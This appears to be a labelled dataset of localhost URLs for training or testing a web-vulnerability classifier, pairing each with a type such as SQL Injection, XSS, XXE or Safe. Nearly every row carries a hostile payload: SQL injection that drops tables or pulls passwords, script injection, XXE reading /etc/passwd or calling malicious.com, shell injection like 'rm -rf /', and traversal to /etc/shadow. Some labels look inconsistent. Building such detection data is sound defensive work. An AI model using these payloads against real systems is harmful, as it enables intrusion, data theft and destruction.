URL,Vulnerability Type
http://127.0.0.1:5000/review?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/order?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/report?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/user?load=config.php,File Inclusion
http://127.0.0.1:5000/cart?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/product?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/comments?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/order?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/admin?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/profile?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/checkout?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/download?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/invoice?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/login?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/cart?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/invoice?load=config.php,File Inclusion
http://127.0.0.1:5000/product?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/checkout?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/user?load=config.php,File Inclusion
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/download?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/comments?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/product?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/report?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/settings?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/posts?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/invoice?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/dashboard?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/dashboard?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/review?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/upload?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/dashboard?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/report?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/order?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/settings?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/profile?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/file?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?load=config.php,File Inclusion
http://127.0.0.1:5000/dashboard?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/messages?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/admin?run=`whoami`,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/comments?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/dashboard?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/upload?run=`whoami`,Command Injection
http://127.0.0.1:5000/messages?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/settings?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/profile?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/product?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/report?run=`whoami`,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/product?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/upload?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/product?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/messages?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/download?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/comments?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/invoice?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/download?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/upload?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/admin?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/dashboard?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/checkout?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/cart?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/comments?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/upload?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/messages?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/messages?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/search?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/product?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/order?user_id=1,Insecure Direct Object Reference
"http://127.0.0.1:5000/order?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/settings?load=config.php,File Inclusion
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/order?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/file?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/search?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/search?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/dashboard?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/file?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/posts?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/review?load=config.php,File Inclusion
http://127.0.0.1:5000/comments?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/comments?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/search?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/review?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/settings?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/login?command=| netstat -an,Command Injection
http://127.0.0.1:5000/posts?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/comments?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/login?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/product?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/settings?load=config.php,File Inclusion
http://127.0.0.1:5000/login?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/search?command=| netstat -an,Command Injection
http://127.0.0.1:5000/order?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/invoice?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/comments?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/file?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/invoice?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/user?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/invoice?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/profile?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/report?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/posts?logfile=log.txt,File Inclusion
"http://127.0.0.1:5000/settings?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/posts?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/report?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/review?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/file?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/messages?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/profile?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/messages?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/file?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/report?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/messages?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/login?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/profile?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/search?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/user?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/file?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/dashboard?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/download?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/review?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/product?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/checkout?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/product?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/dashboard?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/comments?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/file?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/dashboard?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/product?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/cart?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/dashboard?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/admin?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/download?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/messages?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?msg=<img src=x onerror=alert(1)>,XSS
"http://127.0.0.1:5000/checkout?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/dashboard?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/dashboard?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/user?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/comments?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/cart?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/profile?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/admin?logfile=log.txt,File Inclusion
